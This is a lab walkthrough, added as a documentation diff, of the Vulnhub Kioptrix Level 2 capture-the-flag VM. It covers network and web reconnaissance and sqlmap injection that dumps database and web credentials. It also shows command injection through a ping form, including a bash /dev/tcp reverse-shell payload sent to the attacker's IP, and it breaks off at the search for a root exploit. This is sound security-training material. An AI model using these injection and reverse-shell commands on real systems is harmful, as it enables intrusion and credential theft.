@@ -1,0 +1,873 @@
+.. include:: /pentest_links.txt
+
+.. _Kioptrix2:
+
+****************
+Kioptrix Level 2
+****************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub Kioptrix: Level 1.1 (#2) <https://www.vulnhub.com/entry/kioptrix-level-1-1,22/>`_, the second of the `Vulnhub Kioptrix Series <https://www.vulnhub.com/series/kioptrix,8/>`_.
+
+  This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+
+Setting up the VMware VM
+------------------------
+
+The VM comes packaged as `Kioptrix_Level_2.rar <http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar>`_, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of :file:`/etc/shadow`, and delete the root password hash. This will provide passwordless access to Kioptrix2 via root.
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. Kioptrix2 runs CentOS 4.X i686. Here's how you can create a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=kioptrix2
+  curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar
+  $SUDO apt-get install unrar -y
+  $SUDO unrar e Kioptrix_Level_2.rar
+  BACKING="CentOs4.5.vmdk"
+  VM_DISK=$VM-changes.qcow2
+  $SUDO qemu-img create -f qcow2 -o backing_file="$BACKING"  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # BACKING="CentOs4.5.vmdk"
+  # VM_DISK=$VM-changes.qcow2
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the kioptrix2 VM. The actual command the author used in Debian Linux to create the VM was:
+
+.. code-block:: bash
+
+  VM=kioptrix2
+  $SUDO virt-install \
+      --network="bridge=br0" \
+      --name "$VM" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=rhel4 \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+During the boot you’ll have to utilize kudzu hardware configuration: “Remove Configuration” for the PCnet LANCE and Intel Corporation 82371AB 82371AB/EB/MB PIIX4 IDE, then “Configure” the added RTL-8139/8139C/8139C+ NIC to use DHCP. You can “Ignore” the rest of the added devices.
+
+If kioptrix were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=kioptrix2
+  $SUDO virsh shutdown $VM
+  BACKING="CentOs4.5.vmdk"
+  VM_DISK=$VM-changes.qcow2
+  $SUDO qemu-img create -f qcow2 -o backing_file="$BACKING"  $VM_DISK
+  $SUDO virsh start $VM
+
+
+Reconnaisance
+=============
+
+Directory setup
+---------------
+
+We'll refer to the following directories below:
+
+.. code-block:: bash
+
+  BASE=$HOME/pentest
+  PT=$BASE/kioptrix2
+  TOOLS=exploit,nmap,spider,sqlmap
+  eval mkdir -p $PT/{$TOOLS}
+
+Reconnaisance
+-------------
+
+Network reconnaissance
+^^^^^^^^^^^^^^^^^^^^^^
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  cd $PT/nmap
+  NMOUT=nmap
+  SN='192.168.1.0/24'
+  TARGETS=targets.txt
+  $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 9-11
+
+  hacker@kali:~/pentest/kioptrix2$ SUDO=$(which sudo)
+  hacker@kali:~/pentest/kioptrix2$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~/pentest/kioptrix2$ cd $PT/nmap
+  hacker@kali:~/pentest/kioptrix2/nmap$ NMOUT=nmap
+  hacker@kali:~/pentest/kioptrix2/nmap$ SN='192.168.1.0/24'
+  hacker@kali:~/pentest/kioptrix2/nmap$ TARGETS=targets.txt
+  hacker@kali:~/pentest/kioptrix2/nmap$ $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.101
+  Host is up (0.00054s latency).
+  MAC Address: 52:54:00:94:E2:16 (QEMU Virtual NIC)
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/kioptrix2/nmap$ $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  hacker@kali:~/pentest/kioptrix2/nmap$ # use the grep-able output to get a list of target hosts
+  hacker@kali:~/pentest/kioptrix2/nmap$ grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  hacker@kali:~/pentest/kioptrix2/nmap$ # use the xml output to get an html report
+  hacker@kali:~/pentest/kioptrix2/nmap$ xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+At this point we have our target host T=192.168.1.101:
+
+.. code-block:: bash
+
+  T=192.168.1.101
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA ${NMOUT}_A $T
+  $SUDO chown $USER.$USER ${NMOUT}_A.*
+  xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 1,3-9,11-12,15-25,29-39,41-42
+
+  hacker@kali:~/pentest/kioptrix2/nmap$ $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA ${NMOUT}_A $T
+  ###################### SNIP ######################
+  Scanning 192.168.1.101 [1000 ports]
+  Discovered open port 3306/tcp on 192.168.1.101
+  Discovered open port 443/tcp on 192.168.1.101
+  Discovered open port 80/tcp on 192.168.1.101
+  Discovered open port 111/tcp on 192.168.1.101
+  Discovered open port 22/tcp on 192.168.1.101
+  Discovered open port 631/tcp on 192.168.1.101
+  ###################### SNIP ######################
+  PORT     STATE SERVICE  VERSION
+  22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+  |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+  |_sshv1: Server supports SSHv1
+  80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+  111/tcp  open  rpcbind  2 (RPC #100000)
+  | rpcinfo: 
+  |   program version   port/proto  service
+  |   100000  2            111/tcp  rpcbind
+  |   100000  2            111/udp  rpcbind
+  |   100024  1            733/udp  status
+  |_  100024  1            736/tcp  status
+  443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+  ###################### SNIP ######################
+  631/tcp  open  ipp      CUPS 1.1
+  | http-methods: GET HEAD OPTIONS POST PUT
+  | Potentially risky methods: PUT
+  |_See http://nmap.org/nsedoc/scripts/http-methods.html
+  |_http-title: 403 Forbidden
+  3306/tcp open  mysql    MySQL (unauthorized)
+  MAC Address: 52:54:00:94:E2:16 (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.9 - 2.6.30
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/kioptrix2/nmap$ $SUDO chown $USER.$USER ${NMOUT}_A.*
+  hacker@kali:~/pentest/kioptrix2/nmap$ xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Exposed services
+^^^^^^^^^^^^^^^^
+
+Our target kioptrix2 is T=192.168.1.101 and runs:
+
+port 22: OpenSSH 3.9p1 (protocol 1.99)
+""""""""""""""""""""""""""""""""""""""
+
+A :program:`searchsploit` run showed:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ searchsploit openssh
+  --------------------------------------------- ----------------------------------
+   Description                                 |  Path
+  --------------------------------------------- ----------------------------------
+  OpenSSH/PAM <= 3.6.1p1 - Remote Users Discov | /linux/remote/25.c
+  OpenSSH/PAM <= 3.6.1p1 - Remote Users Ident  | /linux/remote/26.sh
+  glibc-2.2 and openssh-2.3.0p1 Exploits glibc | /linux/local/258.sh
+  Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENT | /multiple/dos/1572.pl
+  OpenSSH <= 4.3 p1 (Duplicated Block) Remote  | /multiple/dos/2444.sh
+  Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Ti | /multiple/remote/3303.sh
+  Debian OpenSSH Remote SELinux Privilege Elev | /linux/remote/6094.txt
+  Novell Netware 6.5 - OpenSSH Remote Stack Ov | /novell/dos/14866.txt
+  FreeBSD OpenSSH 3.5p1 - Remote Root Exploit  | /freebsd/remote/17462.txt
+  OpenSSH 1.2 scp File Create/Overwrite Vulner | /linux/remote/20253.sh
+  OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By- | /unix/remote/21314.txt
+  OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buf | /linux/remote/21402.txt
+  OpenSSH 3.x Challenge-Response Buffer Overfl | /unix/remote/21578.txt
+  OpenSSH 3.x Challenge-Response Buffer Overfl | /unix/remote/21579.txt
+  --------------------------------------------- ----------------------------------
+
+None of these applied to the target OpenSSH version.
+
+ports 80, 443: Apache httpd 2.0.52 ((CentOS))
+"""""""""""""""""""""""""""""""""""""""""""""
+
+kioptrix2 runs Apache httpd 2.0.52 ((CentOS)) which `vault.centos.org/4.0 <http://vault.centos.org/4.0/os/i386/CentOS/RPMS/>`_ indicates is CentOS 4.x with the 2.6.9 kernel. We'll delay a vulnerability search for the detailed port 80 & 443 reconnaissance.
+
+ports 111, 733, 736: rpcbind, statd 
+"""""""""""""""""""""""""""""""""""
+
+Run ``rpcinfo -p $T`` to scan port 111:
+
+.. code-block:: console
+  :emphasize-lines: 2,4-
+
+  hacker@kali:~/pentest/kioptrix2/nmap$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/nmap$ rpcinfo -p $T
+     program vers proto   port
+      100000    2   tcp    111  portmapper
+      100000    2   udp    111  portmapper
+      100024    1   udp    733  status
+      100024    1   tcp    736  status
+
+port 631: ipp CUPS 1.1
+""""""""""""""""""""""
+
+A quick search for vulnerabilites didn't reveal any remote vulnerability available without credentials.
+
+port 3306: mysql
+""""""""""""""""
+
+Given CentOS 4.x the MySQL version from `vault.centos.org/4.0 <http://vault.centos.org/4.0/os/i386/CentOS/RPMS/>`_ should be 4.1.7 (CentOS 4.0) - 4.1.22 (CentOS 4.9). Trying to connect directly to mysql got this error:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ mysql -h $T -u root
+  ERROR 1130 (HY000): Host '192.168.1.104' is not allowed to connect to this MySQL server
+
+We'll delay mysql analysis until after port 80 & 443 reconnaissance.
+
+Reconnaisance on ports 80 & 443
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+dirb
+""""
+
+First scan the web server with :program:`dirb`:
+
+.. code-block:: bash
+
+  T=192.168.1.101
+  cd $PT/spider
+  dirb  http://$T/ -o dirb.txt
+
+The results of the scan were:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/spider$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/spider$ cd $PT/spider
+  hacker@kali:~/pentest/kioptrix2/spider$ dirb  http://$T/ -o dirb.txt
+  ###################### SNIP ######################
+  ---- Scanning URL: http://192.168.1.101/ ----
+  + http://192.168.1.101/cgi-bin/ (CODE:403|SIZE:289)                            
+  + http://192.168.1.101/index.php (CODE:200|SIZE:667)                           
+  ==> DIRECTORY: http://192.168.1.101/manual/                                    
+  + http://192.168.1.101/usage (CODE:403|SIZE:286)                               
+  ###################### SNIP ######################
+
+nikto
+"""""
+
+Next up was a :program:`nikto` scan:
+
+.. code-block:: bash
+
+  T=192.168.1.101
+  cd $PT/spider
+  nikto -output nikto.html -host $T -port 80,443
+
+The results of the scan were:
+
+.. code-block:: console
+  :emphasize-lines: 1,3,11,12
+
+  hacker@kali:~/pentest/kioptrix2/spider$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/spider$ cd $PT/spider
+  hacker@kali:~/pentest/kioptrix2/spider$ nikto -output nikto.txt -host $T -port 80,443
+  - Nikto v2.1.6
+  ---------------------------------------------------------------------------
+  + Target IP:          192.168.1.101
+  + Target Hostname:    192.168.1.101
+  + Target Port:        80
+  + Start Time:         2015-06-30 12:24:37 (GMT-7)
+  ---------------------------------------------------------------------------
+  + Server: Apache/2.0.52 (CentOS)
+  + Retrieved x-powered-by header: PHP/4.3.9
+  + The anti-clickjacking X-Frame-Options header is not present.
+  + Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+  + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+  + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+  + OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0 
+  + Uncommon header 'tcn' found, with contents: choice
+  + OSVDB-3092: /manual/: Web server manual found.
+  + OSVDB-3268: /icons/: Directory indexing found.
+  + OSVDB-3268: /manual/images/: Directory indexing found.
+  + OSVDB-3233: /icons/README: Apache default file found.
+  + 7356 requests: 1 error(s) and 15 item(s) reported on remote host
+  + End Time:           2015-06-30 12:25:24 (GMT-7) (47 seconds)
+  ---------------------------------------------------------------------------
+  + Target IP:          192.168.1.101
+  + Target Hostname:    192.168.1.101
+  + Target Port:        443
+  ---------------------------------------------------------------------------
+  + SSL Info:        Subject: /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+                     Ciphers: DHE-RSA-AES256-SHA
+                     Issuer:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+  + Start Time:         2015-06-30 12:25:24 (GMT-7)
+  ---------------------------------------------------------------------------
+  + Server: Apache/2.0.52 (CentOS)
+  + Retrieved x-powered-by header: PHP/4.3.9
+  + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+  + All CGI directories 'found', use '-C none' to test none
+  + Hostname '192.168.1.101' does not match certificate's CN 'localhost.localdomain/emailAddress=root@localhost.localdomain'
+  + Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+  + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+  + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+  + OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-3092: /manual/: Web server manual found.
+  + OSVDB-3268: /icons/: Directory indexing found.
+  + OSVDB-3268: /manual/images/: Directory indexing found.
+  + OSVDB-3233: /icons/README: Apache default file found.
+  + 14714 requests: 1 error(s) and 14 item(s) reported on remote host
+  + End Time:           2015-06-30 12:29:20 (GMT-7) (236 seconds)
+  ---------------------------------------------------------------------------
+  + 2 host(s) tested
+
+Additionally we've found PHP/4.3.9
+
+Visiting the web site
+"""""""""""""""""""""
+
+Visiting the website reveals a "Remote System Administration Login" form:
+
+.. code-block:: console
+  :emphasize-lines: 1,4-27
+
+  hacker@kali:~/pentest/kioptrix2/spider$ curl --silent --insecure https://$T/
+  <html>
+  <body>
+  <form method="post" name="frmLogin" id="frmLogin" action="index.php">
+	  <table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
+		  <tr>
+			  <td colspan='2' align='center'>
+			  <b>Remote System Administration Login</b>
+			  </td>
+		  </tr>
+		  <tr>
+			  <td width="150">Username</td>
+			  <td><input name="uname" type="text"></td>
+		  </tr>
+		  <tr>
+			  <td width="150">Password</td>
+			  <td>
+			  <input name="psw" type="password">
+			  </td>
+		  </tr>
+		  <tr>
+			  <td colspan="2" align="center">
+			  <input type="submit" name="btnLogin" value="Login">
+			  </td>
+		  </tr>
+	  </table>
+  </form>
+
+  <!-- Start of HTML when logged in as Administator -->
+  </body>
+  </html>
+
+:program:`sqlmap` the admin login page
+""""""""""""""""""""""""""""""""""""""
+
+Of course we'll try an immediate :program:`sqlmap` on the form but the MySQL version being pre-5 creates problems:
+
+.. code-block:: bash
+
+  T=192.168.1.101
+  cd $PT/sqlmap
+  URL="https://$T/"
+  rm -rf $PWD/sqlmap
+  sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+     --banner --current-user --is-dba --current-db --users --passwords \
+     --forms --dbs --dbms=MySQL
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/spider$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/spider$ cd $PT/sqlmap
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ URL="https://$T/"
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ rm -rf $PWD/sqlmap
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+  >    --banner --current-user --is-dba --current-db --users --passwords \
+  >    --forms --dbs --dbms=MySQL
+  ###################### SNIP ######################
+  [#1] form:
+  POST https://192.168.1.101:443/index.php
+  POST data: uname=&psw=&btnLogin=Login
+  ###################### SNIP ######################
+  POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+  sqlmap identified the following injection points with a total of 292 HTTP(s) requests:
+  ---
+  Parameter: uname (POST)
+      Type: boolean-based blind
+      Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+      Payload: uname=-9335' OR (8916=8916)#&psw=&btnLogin=Login
+
+      Type: AND/OR time-based blind
+      Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+      Payload: uname=xjtq' AND 7333=BENCHMARK(5000000,MD5(0x68544c4d)) AND 'NruE'='NruE&psw=&btnLogin=Login
+  ###################### SNIP ######################
+  [17:38:59] [INFO] retrieved: 4.1.22
+  web server operating system: Linux CentOS 4.9
+  web application technology: PHP 4.3.9, Apache 2.0.52
+  back-end DBMS: MySQL < 5.0.0
+  banner:    '4.1.22'
+  [17:39:00] [INFO] fetching current user
+  [17:39:00] [INFO] retrieved: john@localhost
+  current user:    'john@localhost'
+  [17:39:04] [INFO] fetching current database
+  [17:39:04] [INFO] retrieved: webapp
+  current database:    'webapp'
+  [17:39:06] [INFO] testing if current user is DBA
+  [17:39:06] [INFO] fetching current user
+  current user is DBA:    False
+  ###################### SNIP ######################
+  database management system users password hashes:                              
+  [*] john [1]:
+      password hash: 5a6914ba69e02807
+      clear-text password: hiroshima
+  [*] root [1]:
+      password hash: 5a6914ba69e02807
+      clear-text password: hiroshima
+
+  [17:39:39] [WARNING] information_schema not available, back-end DBMS is MySQL < 5. database names will be fetched from 'mysql' database
+  ###################### SNIP ######################
+  available databases [2]:
+  [*] `test\\_%`
+  [*] test
+  ###################### SNIP ######################
+
+We got some good and contradictory information on databases: the available databases are "test" and "`test\\_%`", ignoring the current-db of "webapp". And we have these software versions: MySQL 4.1.22, CentOS 4.9, PHP 4.3.9, and Apache 2.0.52.  The database current-user is john who is not a DBA. We also have the passwords for both database users: both john's and root's passwords are "hiroshima".
+
+Now let's go after the webapp database using the root credentials. However, due to no information_schema we'll add the options "--common-tables" and "--common-columns":
+
+.. code-block:: bash
+
+  T=192.168.1.101
+  URL="https://$T/"
+  sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+     --dbms-cred=root:hiroshima --dbms=MySQL \
+     --forms -D webapp --common-tables
+
+Running this gets us the "users" table:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ URL="https://$T/"hacker@kali:~/pentest/kioptrix2/sqlmap$ sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap    --dbms-cred=root:hiroshima --dbms=MySQL    --forms -D webapp --common-tables
+  ###################### SNIP ######################
+  Database: webapp
+  [1 table]
+  +-------+
+  | users |
+  +-------+
+  ###################### SNIP ######################
+
+So let's see what's in the "users" table:
+
+.. code-block:: bash
+
+  T=192.168.1.101
+  URL="https://$T/"
+  sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+     --dbms-cred=root:hiroshima --dbms=MySQL \
+     --forms -D webapp -T users --common-columns
+
+Here are the results:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ URL="https://$T/"
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+  >     --dbms-cred=root:hiroshima --dbms=MySQL \
+  >     --forms -D webapp -T users --common-columns
+  ###################### SNIP ######################
+  Database: webapp
+  Table: users
+  [3 columns]
+  +----------+-------------+
+  | Column   | Type        |
+  +----------+-------------+
+  | id       | numeric     |
+  | password | non-numeric |
+  | username | non-numeric |
+  +----------+-------------+
+  ###################### SNIP ######################
+
+Now that we've got the columns, let's dump the table:
+
+.. code-block:: bash
+
+    T=192.168.1.101
+    URL="https://$T/"
+    sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+       --dbms-cred=root:hiroshima --dbms=MySQL \
+       --forms -D webapp -T users -C id -C password -C username --dump
+
+  Here are the results:
+
+  .. code-block:: console
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ URL="https://$T/"
+  hacker@kali:~/pentest/kioptrix2/sqlmap$ sqlmap -u $URL --random-agent --batch --output-dir $PWD/sqlmap \
+  >    --dbms-cred=root:hiroshima --dbms=MySQL \
+  >    --forms -D webapp -T users -C id -C password -C username --dump
+  ###################### SNIP ######################
+  Database: webapp
+  Table: users
+  [2 entries]
+  +----+----------+------------+
+  | id | username | password   |
+  +----+----------+------------+
+  | 1  | admin    | 5afac8d85f |
+  | 2  | john     | 66lajGGbla |
+  +----+----------+------------+
+  ###################### SNIP ######################
+
+Now we have both the database credentials and the webapp credentials. Let's see what we can do.
+
+
+The Exploits
+============
+
+Exploring the web site
+----------------------
+
+Where are we right now? :program:`sqlmap` has given us these accounts:
+
+=========== ================= ===========
+username    password          application
+=========== ================= ===========
+admin       5afac8d85f        webapp
+john        66lajGGbla        webapp
+john        hiroshima         mysql
+root        hiroshima         mysql
+=========== ================= ===========
+
+and these application versions:
+
+============ ========
+application  version
+============ ========
+CentOS       4.9
+Apache       2.0.52
+MySQL        4.1.22
+PHP          4.3.9
+============ ========
+
+So let's login with admin/5afac8d85f at the sysadmin login page and see where that leads:
+
+.. code-block:: console
+
+  T=192.168.1.101
+  U=admin
+  P=5afac8d85f
+  COOKIES=cookies.txt
+  # See what the login form looks like
+  curl --silent --insecure https://$T/ | sed -ne '/<form/,/<\/form>/p'
+  # Fill out form and get cookies
+  curl --silent --insecure https://$T/index.php \
+       --data uname="$U" \
+       --data psw="$P" \
+       --data btnLogin="Login" \
+       --cookie-jar "$COOKIES"
+  ls -l $COOKIES
+  # What? No cookies?
+  # But we found another form to ping a remote server.
+  # Perhaps we can do shell code injection to get a reverse shell.
+  # First start up listener in another terminal window:
+
+Here's the results from running the above:
+
+.. code-block:: console
+  :emphasize-lines: 6,7,16,21,26,41,53,54
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ T=192.168.1.101
+  hacker@kali:~/pentest/kioptrix2/exploit$ U=admin
+  hacker@kali:~/pentest/kioptrix2/exploit$ P=5afac8d85f
+  hacker@kali:~/pentest/kioptrix2/exploit$ COOKIES=cookies.txt
+  hacker@kali:~/pentest/kioptrix2/exploit$ # See what the login form looks like
+  hacker@kali:~/pentest/kioptrix2/exploit$ curl --silent --insecure https://$T/ | sed -ne '/<form/,/<\/form>/p'
+  <form method="post" name="frmLogin" id="frmLogin" action="index.php">
+	  <table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
+		  <tr>
+			  <td colspan='2' align='center'>
+			  <b>Remote System Administration Login</b>
+			  </td>
+		  </tr>
+		  <tr>
+			  <td width="150">Username</td>
+			  <td><input name="uname" type="text"></td>
+		  </tr>
+		  <tr>
+			  <td width="150">Password</td>
+			  <td>
+			  <input name="psw" type="password">
+			  </td>
+		  </tr>
+		  <tr>
+			  <td colspan="2" align="center">
+			  <input type="submit" name="btnLogin" value="Login">
+			  </td>
+		  </tr>
+	  </table>
+  </form>
+  hacker@kali:~/pentest/kioptrix2/exploit$ # Fill out form and get cookies
+  hacker@kali:~/pentest/kioptrix2/exploit$ curl --silent --insecure https://$T/index.php \
+  >      --data uname="$U" \
+  >      --data psw="$P" \
+  >      --data btnLogin="Login" \
+  >      --cookie-jar "$COOKIES"
+  <html>
+  <body>
+
+  <!-- Start of HTML when logged in as Administator -->
+	  <form name="ping" action="pingit.php" method="post" target="_blank">
+		  <table width='600' border='1'>
+		  <tr valign='middle'>
+			  <td colspan='2' align='center'>
+			  <b>Welcome to the Basic Administrative Web Console<br></b>
+			  </td>
+		  </tr>
+		  <tr valign='middle'>
+			  <td align='center'>
+				  Ping a Machine on the Network:
+			  </td>
+				  <td align='center'>
+				  <input type="text" name="ip" size="30">
+				  <input type="submit" value="submit" name="submit">
+			  </td>
+			  </td>
+		  </tr>
+	  </table>
+	  </form>
+
+
+  </body>
+  </html>
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ ls -l $COOKIES
+  ls: cannot access cookies.txt: No such file or directory
+  hacker@kali:~/pentest/kioptrix2/exploit$ # What? No cookies?
+  hacker@kali:~/pentest/kioptrix2/exploit$ # But we found another form to ping a remote server.
+  hacker@kali:~/pentest/kioptrix2/exploit$ # Perhaps we can do shell code injection to get a reverse shell.
+  hacker@kali:~/pentest/kioptrix2/exploit$ # First start up listener in another terminal window:
+
+
+Getting a reverse bash shell
+----------------------------
+
+So we found another web page allowing us to ping a host. A little experimentation shows it allows us to inject bash code. (Try 'localhost; cat /etc/passwd', for example.) So let's pop up a reverse shell. First step is to create a :program:`socat` listener on Kali in another terminal window:
+
+.. code-block:: console
+
+  # Do this in another terminal window
+  MYPORT=4444
+  socat - TCP-LISTEN:$MYPORT
+
+Continuing on in the original terminal window, inject a reverse bash shell (see `Reverse Shell Cheat Sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_):
+
+.. code-block:: bash
+
+  # Next inject reverse shell after ping command:
+  MYIP=192.168.1.104
+  MYPORT=4444
+  COMMAND='localhost;  bash -i >& /dev/tcp/'$MYIP/$MYPORT' 0>&1'
+  curl --silent --insecure https://$T/pingit.php \
+       --data-urlencode ip="$COMMAND" \
+       --data submit="submit"
+
+In the :program:`socat` listener window we get a reverse shell with the apache user:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix2/exploit$ socat - TCP-LISTEN:$MYPORT
+  bash: no job control in this shell
+  bash-3.00$ id
+  uid=48(apache) gid=48(apache) groups=48(apache)
+  bash-3.00$ uname -a
+  Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
+  bash-3.00$ hostname
+  kioptrix.level2
+  bash-3.00$ cat /etc/red*
+  cat: /etc/redhat-lsb: Is a directory
+  CentOS release 4.5 (Final)
+  bash-3.00$ 
+
+Getting to root from apache
+---------------------------
+
+We're just a local root exploit away from success. There are a few ways to search for root exploits:
+
+#. :program:`searchsploit` on Kali.
+
+   Run ``searchsploit SEARCH TERMS`` to get a list of possible exploits.
+
+#. `Exploit Database Search <https://www.exploit-db.com/search/>`_ to get an updated, online equivalent to :program:`searchsploit`.
+
+#. `PenturaLabs/Linux_Exploit_Suggester <https://github.com/PenturaLabs/Linux_Exploit_Suggester>`_
+
